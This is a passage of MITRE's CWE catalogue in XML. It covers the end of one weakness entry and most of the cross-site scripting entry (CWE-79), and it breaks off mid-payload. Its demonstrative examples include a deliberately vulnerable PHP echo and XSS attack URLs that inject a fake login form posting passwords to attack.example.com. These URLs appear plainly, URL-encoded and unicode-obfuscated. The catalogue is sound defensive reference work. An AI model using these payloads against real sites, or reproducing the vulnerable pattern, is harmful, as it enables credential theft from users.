	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SI-1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SI-2</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-3</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 3.5</Entry_Name>
	   </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <References>
	    <Reference External_Reference_ID="REF-1029"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Stack Overruns&#34; Page 129"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Heap Overruns&#34; Page 138"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 5: Buffer Overruns.&#34; Page 89"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Nonexecutable Stack&#34;, Page 76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 5, &#34;Protection Mechanisms&#34;, Page 189"/>
            <Reference External_Reference_ID="REF-90"/>
            <Reference External_Reference_ID="REF-56"/>
            <Reference External_Reference_ID="REF-57"/>
            <Reference External_Reference_ID="REF-58"/>
            <Reference External_Reference_ID="REF-60"/>
            <Reference External_Reference_ID="REF-61"/>
            <Reference External_Reference_ID="REF-64"/>
	    <Reference External_Reference_ID="REF-1332"/>
	    <Reference External_Reference_ID="REF-1333"/>
	    <Reference External_Reference_ID="REF-1334"/>
	    <Reference External_Reference_ID="REF-1335"/>
	    <Reference External_Reference_ID="REF-1336"/>
	    <Reference External_Reference_ID="REF-1337" Section="Memory information leaks"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-10-21</Submission_Date>
               <Submission_Version>1.6</Submission_Version>
               <Submission_ReleaseDate>2009-10-29</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
         <Extended_Description>
            <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
            <xhtml:ol>
               <xhtml:li>Untrusted data enters a web application, typically from a web request.</xhtml:li>
               <xhtml:li>The web application dynamically generates a web page that contains this untrusted data.</xhtml:li>
               <xhtml:li>During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</xhtml:li>
               <xhtml:li>A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</xhtml:li>
               <xhtml:li>Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</xhtml:li>
               <xhtml:li>This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</xhtml:li>
            </xhtml:ol>
            <xhtml:p>There are three main kinds of XSS:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>
                  <xhtml:b>Type 1: Reflected XSS (or Non-Persistent)</xhtml:b> - 
         			The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 2: Stored XSS (or Persistent)</xhtml:b> - 
               The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
            </xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 0: DOM-Based XSS</xhtml:b> - 
               In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
            </xhtml:li>
            </xhtml:ul>
            <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="494" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="352" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:p>The Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
               <xhtml:p>When referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSS</Term>
               <Description>A common abbreviation for Cross-Site Scripting.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTML Injection</Term>
               <Description>Used as a synonym of stored (Type 2) XSS.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>CSS</Term>
               <Description>In the early years after initial discovery of XSS, "CSS" was a commonly-used acronym.  However, this would cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.</Effectiveness_Notes>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</xhtml:p>
                  <xhtml:p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</xhtml:p>
                  <xhtml:p>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>HTML body</xhtml:li>
                        <xhtml:li>Element attributes (such as src="XYZ")</xhtml:li>
                        <xhtml:li>URIs</xhtml:li>
                        <xhtml:li>JavaScript sections</xhtml:li>
                        <xhtml:li>Cascading Style Sheets and style property</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>etc. Note that HTML Entity Encoding is only appropriate for the HTML body.</xhtml:p>
                  <xhtml:p>Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                  <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$username = $_GET['username'];<xhtml:br/>echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:1em;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
                     <xhtml:br/>&lt;/div&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br/>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br/>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br/>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br/>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br/>+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br/>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br/>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
               </Example_Code>
               <Body_Text>The same attack string could also be obfuscated as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<xhtml:br/>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<xhtml:br/>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<xhtml:br/>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<xhtml:br/>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<xhtml:br/>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<xhtml:br/>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<xhtml:br/>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<xhtml:br/>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<xhtml:br/>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<xhtml:br/>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<xhtml:br/>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<xhtml:br/>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<xhtml:br/>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<xhtml:br/>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<xhtml:br/>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<xhtml:br/>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<xhtml:br/>\u0074\u0020\u0074\u007